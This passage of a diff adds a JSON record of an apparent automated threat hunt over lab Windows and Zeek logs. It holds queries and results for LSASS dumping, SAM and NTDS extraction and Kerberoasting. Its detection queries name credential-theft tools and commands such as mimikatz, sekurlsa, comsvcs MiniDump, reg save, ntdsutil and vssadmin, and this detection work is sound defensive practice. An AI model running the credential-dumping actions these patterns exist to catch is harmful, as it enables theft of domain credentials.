+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+10daa|c:\\windows\\system32\\lsm.dll+1008d|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a...(+298 chars; use get_event)",
+            "AaFFkNQ25mySA1RoJ7pH",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:11:40.144Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+ff97|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+...(+263 chars; use get_event)",
+            "AaFFkNQ25mySA1RpKsKn",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:11:40.144Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+10daa|c:\\windows\\system32\\lsm.dll+1008d|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a...(+298 chars; use get_event)",
+            "AaFFkNQ25mySA1RpKsKs",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:10:39.001Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+ff97|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+...(+263 chars; use get_event)",
+            "AaFFkNQ25mySA1RqLrhi",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:10:39.001Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+10daa|c:\\windows\\system32\\lsm.dll+1008d|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a...(+298 chars; use get_event)",
+            "AaFFkNQ25mySA1RqLrhj",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:10:39.000Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+ff97|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+...(+263 chars; use get_event)",
+            "AaFFkNQ25mySA1RqLri2",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:10:39.000Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+10daa|c:\\windows\\system32\\lsm.dll+1008d|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a...(+298 chars; use get_event)",
+            "AaFFkNQ25mySA1RqLri3",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:09:29.430Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\wsmprovhost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1f3fff",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+2732e|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System\\9803982d7bc887e2745bff18a434ece1\\System.ni.dll+381f60|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System\\9803982d7bc887e2745bff18a434ece1\\System.ni.dll+2fa12e|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System\\9803982d7bc887e2745bff18a434ece1\\System.ni.dll+2f8cd5...(+832 chars; use get_event)",
+            "AaFFkNQ25mySA1RrM7IJ",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:05:28.161Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+10daa|c:\\windows\\system32\\lsm.dll+1008d|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a...(+298 chars; use get_event)",
+            "AaFFkNQ25mySA1R8i4jP",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:05:28.161Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+ff97|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+...(+263 chars; use get_event)",
+            "AaFFkNQ25mySA1R8i4jg",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:05:26.911Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+10daa|c:\\windows\\system32\\lsm.dll+1008d|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a...(+298 chars; use get_event)",
+            "AaFFkNQ25mySA1R9j4eK",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:05:26.911Z",
+            "nashua.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9c584|C:\\windows\\System32\\KERNELBASE.dll+6a8b5|c:\\windows\\system32\\lsm.dll+ff97|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+...(+263 chars; use get_event)",
+            "AaFFkNQ25mySA1R9j4eT",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:16:36.925Z",
+            "newyork.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9fc24|C:\\windows\\System32\\KERNELBASE.dll+6c175|c:\\windows\\system32\\lsm.dll+f2e7|c:\\windows\\system32\\lsm.dll+dea4|C:\\windows\\System32\\RPCRT4.dll+77803|C:\\windows\\System32\\RPCRT4.dll+db4a6|C:\\windows\\System32\\RPCRT4.dll+10d20|C:\\windows\\System32\\RPCRT4.dll+54a18|C:\\windows\\System32\\RPCRT4.dll+30490|C:\\windows\\System32\\RPCRT4.dll+2fe3b|C:\\windows\\System32\\RPCRT4.dll+221f...(+296 chars; use get_event)",
+            "AaFFkNQ25mySA1Nf-FOQ",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:16:36.925Z",
+            "newyork.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9fc24|C:\\windows\\System32\\KERNELBASE.dll+6c175|c:\\windows\\system32\\lsm.dll+e21a|c:\\windows\\system32\\lsm.dll+df94|C:\\windows\\System32\\RPCRT4.dll+77803|C:\\windows\\System32\\RPCRT4.dll+db4a6|C:\\windows\\System32\\RPCRT4.dll+10d20|C:\\windows\\System32\\RPCRT4.dll+54a18|C:\\windows\\System32\\RPCRT4.dll+30490|C:\\windows\\System32\\RPCRT4.dll+2fe3b|C:\\windows\\System32\\RPCRT4.dll+221f...(+296 chars; use get_event)",
+            "AaFFkNQ25mySA1Nf-FOR",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:16:36.581Z",
+            "newyork.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9fc24|C:\\windows\\System32\\KERNELBASE.dll+6c175|c:\\windows\\system32\\lsm.dll+f2e7|c:\\windows\\system32\\lsm.dll+dea4|C:\\windows\\System32\\RPCRT4.dll+77803|C:\\windows\\System32\\RPCRT4.dll+db4a6|C:\\windows\\System32\\RPCRT4.dll+10d20|C:\\windows\\System32\\RPCRT4.dll+54a18|C:\\windows\\System32\\RPCRT4.dll+30490|C:\\windows\\System32\\RPCRT4.dll+2fe3b|C:\\windows\\System32\\RPCRT4.dll+221f...(+296 chars; use get_event)",
+            "AaFFkNQ25mySA1Nf-FO1",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:16:36.581Z",
+            "newyork.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9fc24|C:\\windows\\System32\\KERNELBASE.dll+6c175|c:\\windows\\system32\\lsm.dll+e21a|c:\\windows\\system32\\lsm.dll+df94|C:\\windows\\System32\\RPCRT4.dll+77803|C:\\windows\\System32\\RPCRT4.dll+db4a6|C:\\windows\\System32\\RPCRT4.dll+10d20|C:\\windows\\System32\\RPCRT4.dll+54a18|C:\\windows\\System32\\RPCRT4.dll+30490|C:\\windows\\System32\\RPCRT4.dll+2fe3b|C:\\windows\\System32\\RPCRT4.dll+221f...(+296 chars; use get_event)",
+            "AaFFkNQ25mySA1Nf-FO2",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:16:35.034Z",
+            "newyork.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9fc24|C:\\windows\\System32\\KERNELBASE.dll+6c175|c:\\windows\\system32\\lsm.dll+f2e7|c:\\windows\\system32\\lsm.dll+dea4|C:\\windows\\System32\\RPCRT4.dll+77803|C:\\windows\\System32\\RPCRT4.dll+db4a6|C:\\windows\\System32\\RPCRT4.dll+10d20|C:\\windows\\System32\\RPCRT4.dll+54a18|C:\\windows\\System32\\RPCRT4.dll+30490|C:\\windows\\System32\\RPCRT4.dll+2fe3b|C:\\windows\\System32\\RPCRT4.dll+221f...(+296 chars; use get_event)",
+            "AaFFkNQ25mySA1Ng_Q5S",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:16:35.034Z",
+            "newyork.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9fc24|C:\\windows\\System32\\KERNELBASE.dll+6c175|c:\\windows\\system32\\lsm.dll+e21a|c:\\windows\\system32\\lsm.dll+df94|C:\\windows\\System32\\RPCRT4.dll+77803|C:\\windows\\System32\\RPCRT4.dll+db4a6|C:\\windows\\System32\\RPCRT4.dll+10d20|C:\\windows\\System32\\RPCRT4.dll+54a18|C:\\windows\\System32\\RPCRT4.dll+30490|C:\\windows\\System32\\RPCRT4.dll+2fe3b|C:\\windows\\System32\\RPCRT4.dll+221f...(+296 chars; use get_event)",
+            "AaFFkNQ25mySA1Ng_Q5n",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:16:32.862Z",
+            "newyork.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9fc24|C:\\windows\\System32\\KERNELBASE.dll+6c175|c:\\windows\\system32\\lsm.dll+f2e7|c:\\windows\\system32\\lsm.dll+dea4|C:\\windows\\System32\\RPCRT4.dll+77803|C:\\windows\\System32\\RPCRT4.dll+db4a6|C:\\windows\\System32\\RPCRT4.dll+10d20|C:\\windows\\System32\\RPCRT4.dll+54a18|C:\\windows\\System32\\RPCRT4.dll+30490|C:\\windows\\System32\\RPCRT4.dll+2fe3b|C:\\windows\\System32\\RPCRT4.dll+221f...(+296 chars; use get_event)",
+            "AaFFkNQ25mySA1RgAMLh",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:16:32.862Z",
+            "newyork.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9fc24|C:\\windows\\System32\\KERNELBASE.dll+6c175|c:\\windows\\system32\\lsm.dll+e21a|c:\\windows\\system32\\lsm.dll+df94|C:\\windows\\System32\\RPCRT4.dll+77803|C:\\windows\\System32\\RPCRT4.dll+db4a6|C:\\windows\\System32\\RPCRT4.dll+10d20|C:\\windows\\System32\\RPCRT4.dll+54a18|C:\\windows\\System32\\RPCRT4.dll+30490|C:\\windows\\System32\\RPCRT4.dll+2fe3b|C:\\windows\\System32\\RPCRT4.dll+221f...(+296 chars; use get_event)",
+            "AaFFkNQ25mySA1RgAMLi",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:06:13.134Z",
+            "newyork.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9fc24|C:\\windows\\System32\\KERNELBASE.dll+6c175|c:\\windows\\system32\\lsm.dll+e21a|c:\\windows\\system32\\lsm.dll+df94|C:\\windows\\System32\\RPCRT4.dll+77803|C:\\windows\\System32\\RPCRT4.dll+db4a6|C:\\windows\\System32\\RPCRT4.dll+10d20|C:\\windows\\System32\\RPCRT4.dll+54a18|C:\\windows\\System32\\RPCRT4.dll+30490|C:\\windows\\System32\\RPCRT4.dll+2fe3b|C:\\windows\\System32\\RPCRT4.dll+221f...(+296 chars; use get_event)",
+            "AaFFkNQ25mySA1R5ffjc",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:06:13.134Z",
+            "newyork.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9fc24|C:\\windows\\System32\\KERNELBASE.dll+6c175|c:\\windows\\system32\\lsm.dll+f2e7|c:\\windows\\system32\\lsm.dll+dea4|C:\\windows\\System32\\RPCRT4.dll+77803|C:\\windows\\System32\\RPCRT4.dll+db4a6|C:\\windows\\System32\\RPCRT4.dll+10d20|C:\\windows\\System32\\RPCRT4.dll+54a18|C:\\windows\\System32\\RPCRT4.dll+30490|C:\\windows\\System32\\RPCRT4.dll+2fe3b|C:\\windows\\System32\\RPCRT4.dll+221f...(+296 chars; use get_event)",
+            "AaFFkNQ25mySA1R5ffjm",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ],
+          [
+            "2020-05-02T03:03:32.987Z",
+            "newyork.dmevals.local",
+            "C:\\windows\\system32\\svchost.exe",
+            "C:\\windows\\system32\\lsass.exe",
+            "0x1000",
+            "C:\\windows\\SYSTEM32\\ntdll.dll+9fc24|C:\\windows\\System32\\KERNELBASE.dll+6c175|c:\\windows\\system32\\lsm.dll+e21a|c:\\windows\\system32\\lsm.dll+df94|C:\\windows\\System32\\RPCRT4.dll+77803|C:\\windows\\System32\\RPCRT4.dll+db4a6|C:\\windows\\System32\\RPCRT4.dll+10d20|C:\\windows\\System32\\RPCRT4.dll+54a18|C:\\windows\\System32\\RPCRT4.dll+30490|C:\\windows\\System32\\RPCRT4.dll+2fe3b|C:\\windows\\System32\\RPCRT4.dll+221f...(+296 chars; use get_event)",
+            "AaFFkNQ25mySA1SBnqby",
+            ".ds-logs-windows.sysmon-default-2026.10.16-000001"
+          ]
+        ],
+        "rows": 326,
+        "truncated": false
+      }
+    },
+    {
+      "technique": "T1003.001",
+      "dataset": "windows.sysmon",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:1 AND (process.command_line:*comsvcs* OR process.command_line:*MiniDump* OR process.command_line:*procdump* OR process.command_line:*mimikatz* OR process.command_line:*sekurlsa*)"
+      },
+      "purpose": "Detect credential-dumping tool execution (comsvcs.dll MiniDump, ProcDump, Mimikatz-style command lines) on the Windows hosts.",
+      "check_id": "C004",
+      "query_id": "q-781f2b0f8c",
+      "error": null,
+      "total": 0,
+      "result": {
+        "query_id": "q-781f2b0f8c",
+        "total": 0,
+        "returned": 0,
+        "hits": []
+      }
+    },
+    {
+      "technique": "T1003.001",
+      "dataset": "windows.powershell",
+      "tool": "esql",
+      "args": {
+        "query": "FROM logs-windows.powershell-default METADATA _id, _index | WHERE event.code == \"4104\" AND (TO_LOWER(powershell.script_block_text) LIKE \"*mimikatz*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*sekurlsa*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*minidump*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*comsvcs*\") | KEEP @timestamp, host.name, user.name, win.ScriptBlockId, _id, _index"
+      },
+      "purpose": "Find script blocks containing LSASS-dump primitives (Mimikatz/Sekurlsa/comsvcs MiniDump) executed through PowerShell.",
+      "check_id": "C005",
+      "query_id": "q-0d9c585271",
+      "error": null,
+      "total": 0,
+      "result": {
+        "query_id": "q-0d9c585271",
+        "columns": [
+          "@timestamp",
+          "host.name",
+          "user.name",
+          "win.ScriptBlockId",
+          "_id",
+          "_index"
+        ],
+        "values": [],
+        "rows": 0,
+        "truncated": false
+      }
+    },
+    {
+      "technique": "T1003.002",
+      "dataset": "windows.sysmon",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:13 AND win.TargetObject:*SAM*"
+      },
+      "purpose": "Look for registry writes against the SAM hive (credential material stored in HKLM\\SAM\\SAM\\Domains\\Account).",
+      "check_id": "C006",
+      "query_id": "q-6732500511",
+      "error": null,
+      "total": 2,
+      "result": {
+        "query_id": "q-6732500511",
+        "total": 2,
+        "returned": 2,
+        "hits": [
+          {
+            "_index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+            "_id": "AaFFkNQ25mySA1NY3HhA",
+            "@timestamp": "2020-05-02T03:19:10.368Z",
+            "host.name": "scranton.dmevals.local",
+            "event.dataset": "windows.sysmon",
+            "event.code": 13,
+            "process.executable": "C:\\windows\\system32\\lsass.exe",
+            "message": "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-05-02 03:19:10.368\r\nProcessGuid: {47ab858c-e6ad-5eac-0c00-000000000500}\r\nProcessId: 748\r\nImage: C:\\windows\\system32\\lsass.exe\r\nTargetObject: HKLM\\SAM\\SAM\\Domains\\Account\\F\r\nDetails: Binary Data"
+          },
+          {
+            "_index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+            "_id": "AaFFkNQ25mySA1NFikC_",
+            "@timestamp": "2020-05-02T03:20:46.738Z",
+            "host.name": "scranton.dmevals.local",
+            "event.dataset": "windows.sysmon",
+            "event.code": 13,
+            "process.executable": "C:\\windows\\system32\\LogonUI.exe",
+            "message": "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-05-02 03:20:46.738\r\nProcessGuid: {47ab858c-e70b-5eac-b200-000000000500}\r\nProcessId: 4404\r\nImage: C:\\windows\\system32\\LogonUI.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI\\SessionData\\2\\LoggedOnSAMUser\r\nDetails: DMEVALS\\pbeesly"
+          }
+        ]
+      }
+    },
+    {
+      "technique": "T1003.002",
+      "dataset": "windows.security",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.security",
+        "query": "event.code:4663 AND win.ObjectName:*SAM*"
+      },
+      "purpose": "Detect audited object access to SAM registry keys by non-system principals.",
+      "check_id": "C007",
+      "query_id": "q-d6416ffeb8",
+      "error": null,
+      "total": 0,
+      "result": {
+        "query_id": "q-d6416ffeb8",
+        "total": 0,
+        "returned": 0,
+        "hits": []
+      }
+    },
+    {
+      "technique": "T1003.002",
+      "dataset": "windows.sysmon",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:1 AND (process.command_line:*reg save* OR process.command_line:*esentutl* OR process.command_line:*\\\\SAM\\\\* OR process.command_line:*SYSTEM*)"
+      },
+      "purpose": "Detect hive-copying commands (reg save, esentutl) used to exfiltrate SAM/SECURITY/SYSTEM for offline credential extraction.",
+      "check_id": "C008",
+      "query_id": "q-78c35491a2",
+      "error": null,
+      "total": 0,
+      "result": {
+        "query_id": "q-78c35491a2",
+        "total": 0,
+        "returned": 0,
+        "hits": []
+      }
+    },
+    {
+      "technique": "T1003.003",
+      "dataset": "windows.sysmon",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:11 AND (win.TargetFilename:*ntds.dit* OR file.path:*ntds.dit*)"
+      },
+      "purpose": "Detect creation/copy of ntds.dit (domain credential database) on disk.",
+      "check_id": "C009",
+      "query_id": "q-ae9a5f06b4",
+      "error": null,
+      "total": 0,
+      "result": {
+        "query_id": "q-ae9a5f06b4",
+        "total": 0,
+        "returned": 0,
+        "hits": []
+      }
+    },
+    {
+      "technique": "T1003.003",
+      "dataset": "windows.sysmon",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:1 AND (process.command_line:*ntdsutil* OR process.command_line:*\"ac i ntds\"* OR process.command_line:*vssadmin*)"
+      },
+      "purpose": "Detect NTDS extraction tooling (ntdsutil IFM / 'ac i ntds', shadow copy creation) on the Windows hosts.",
+      "check_id": "C010",
+      "query_id": "q-00ebd8ebb4",
+      "error": null,
+      "total": 0,
+      "result": {
+        "query_id": "q-00ebd8ebb4",
+        "total": 0,
+        "returned": 0,
+        "hits": []
+      }
+    },
+    {
+      "technique": "T1003.003",
+      "dataset": "windows.security",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.security",
+        "query": "event.code:4688 AND (process.command_line:*ntdsutil* OR process.command_line:*esentutl*)"
+      },
+      "purpose": "Confirm NTDS/hive extraction via process-creation auditing (4688) independent of Sysmon coverage.",
+      "check_id": "C011",
+      "query_id": "q-5a8d82fcfc",
+      "error": null,
+      "total": 0,
+      "result": {
+        "query_id": "q-5a8d82fcfc",
+        "total": 0,
+        "returned": 0,
+        "hits": []
+      }
+    },
+    {
+      "technique": "T1558.003",
+      "dataset": "windows.security",
+      "tool": "aggregate",
+      "args": {
+        "dataset": "windows.security",
+        "query": "event.code:4769",
+        "field": "event.code"
+      },
+      "purpose": "Verify whether Kerberos service-ticket requests (4769) are in the collected Security telemetry at all; if absent, document that Kerberoasting cannot be confirmed or refuted from this window.",
+      "check_id": "C012",
+      "query_id": "q-350bf7377b",
+      "error": null,
+      "total": 28,
+      "result": {
+        "query_id": "q-350bf7377b",
+        "total": 28,
+        "field": "event.code",
+        "buckets": [
+          {
+            "value": "4769",
+            "count": 28
+          }
+        ],
+        "other_count": 0
+      }
+    },
+    {
+      "technique": "T1558.003",
+      "dataset": "zeek",
+      "tool": "aggregate",
+      "args": {
+        "dataset": "zeek",
+        "query": "event.action:kerberos",
+        "field": "zeek.cipher"
+      },
+      "purpose": "On the (non-overlapping) network capture window, stack Kerberos tickets by cipher — RC4/rc4-hmac TGS requests in bulk are a Kerberoasting indicator.",
+      "check_id": "C013",
+      "query_id": "q-a10ad7719d",
+      "error": null,
+      "total": 35,
+      "result": {
+        "query_id": "q-a10ad7719d",
+        "total": 35,
+        "field": "zeek.cipher",
+        "buckets": [
+          {
+            "value": "aes256-cts-hmac-sha1-96",
+            "count": 18
+          }
+        ],
+        "other_count": 0
+      }
+    },
+    {
+      "technique": "T1558.003",
+      "dataset": "zeek",
+      "tool": "search",
+      "args": {
+        "dataset": "zeek",
+        "query": "event.action:kerberos AND (zeek.error_msg:* OR zeek.success:false)"
+      },
+      "purpose": "Read failing/anomalous Kerberos exchanges (error codes, unsupported cipher) that accompany roasting or credential misuse.",
+      "check_id": "C014",
+      "query_id": "q-d16a0b10de",
+      "error": null,
+      "total": 7,
+      "result": {
+        "query_id": "q-d16a0b10de",
+        "total": 7,
+        "returned": 7,
+        "hits": [
+          {
+            "_index": ".ds-logs-zeek-default-2026.10.16-000001",
+            "_id": "AaFFktQ25mySA1aO8Idf",
+            "@timestamp": "2020-04-30T00:24:19.110Z",
+            "observer.name": "simplerockbuild.simplerock.lan",
+            "event.dataset": "zeek",
+            "source.ip": "10.0.1.4",
+            "destination.ip": "10.0.0.4",
